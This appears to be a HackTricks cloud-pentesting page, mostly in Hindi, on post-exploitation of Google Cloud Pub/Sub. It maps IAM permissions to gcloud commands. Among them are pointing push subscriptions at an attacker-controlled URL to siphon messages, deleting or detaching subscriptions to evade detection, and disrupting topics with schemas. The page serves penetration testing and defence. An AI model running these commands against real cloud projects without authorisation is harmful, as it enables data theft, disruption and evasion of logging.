# GCP - Pub/Sub Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Pub/Sub

Pub/Sub के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.topics.publish`

एक topic में संदेश प्रकाशित करना, जो **अनपेक्षित डेटा भेजने** और अनपेक्षित कार्यक्षमताओं को ट्रिगर करने या कमजोरियों का शोषण करने के लिए उपयोगी है:

<details>

<summary>topic में संदेश प्रकाशित करें</summary>
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
</details>

### `pubsub.topics.detachSubscription`

यह किसी subscription को संदेश प्राप्त करने से रोकने के लिए उपयोगी है, शायद पहचान से बचने के लिए।

<details>

<summary>subscription को topic से अलग करें</summary>
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.topics.delete`

यह subscription को messages प्राप्त करने से रोकने के लिए उपयोगी है, संभवतः detection से बचने के लिए।\
यह संभव है कि एक topic को तब भी delete किया जा सके जब उसके साथ subscriptions जुड़े हों।

<details>

<summary>Delete topic</summary>
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
</details>

### `pubsub.topics.update`

इस अनुमति का उपयोग टॉपिक की कुछ सेटिंग अपडेट करने के लिए करें ताकि इसे बाधित किया जा सके, जैसे `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

खुद को अनुमति दें ताकि आप पूर्व के किसी भी attacks को अंजाम दे सकें।

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

वेब सर्वर में सभी संदेश प्राप्त करें:

<details>

<summary>Create push subscription to receive messages</summary>
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
</details>

एक subscription बनाएँ और इसका उपयोग करके **pull messages** प्राप्त करें:

<details>

<summary>pull subscription बनाएँ और messages प्राप्त करें</summary>
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
</details>

### `pubsub.subscriptions.delete`

**एक subscription हटाना** लॉग प्रोसेसिंग सिस्टम या इसी तरह की किसी चीज़ को बाधित करने के लिए उपयोगी हो सकता है:

<details>

<summary>subscription हटाएं</summary>
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.subscriptions.update`

इस अनुमति का उपयोग किसी सेटिंग को अपडेट करने के लिए करें ताकि संदेश ऐसी जगह संग्रहीत हों जहाँ आप पहुँच सकें (URL, Big Query table, Bucket) या बस इसे बाधित करने के लिए।

<details>

<summary>सब्सक्रिप्शन अपडेट एंडपॉइंट</summary>
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
</details>

### `pubsub.subscriptions.setIamPolicy`

अपने आपको वे permissions दें जो पहले बताए गए किसी भी attacks को करने के लिए आवश्यक हैं।

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

एक schema को किसी topic से attach करें ताकि messages उसे पूरा न करें और इसलिए topic बाधित हो जाए।\\
यदि कोई schemas नहीं हैं तो आपको एक create करने की आवश्यकता हो सकती है।

<details>

<summary>schema फ़ाइल बनाएं और उसे topic से attach करें</summary>
```json:schema.json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
</details>

### `pubsub.schemas.delete`

यह ऐसा लग सकता है कि schema को हटाने से आप ऐसे messages भेज पाएँगे जो schema के अनुरूप नहीं हैं। हालाँकि, क्योंकि schema हटाया जाएगा, कोई भी message असल में topic के अंदर प्रवेश नहीं करेगा। तो यह **बेकार** है:

<details>

<summary>Delete schema (उपयोगी नहीं)</summary>
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
</details>

### `pubsub.schemas.setIamPolicy`

उन अनुमतियों को खुद को दें जो पहले बताए गए attacks को अंजाम देने के लिए आवश्यक हैं।

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

यह सभी unACKed messages का एक snapshot बनाएगा और उन्हें subscription में वापस डाल देगा। attacker के लिए ज्यादा उपयोगी नहीं है, पर यहाँ है:

<details>

<summary>Snapshot बनाएं और उस पर seek करें</summary>
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
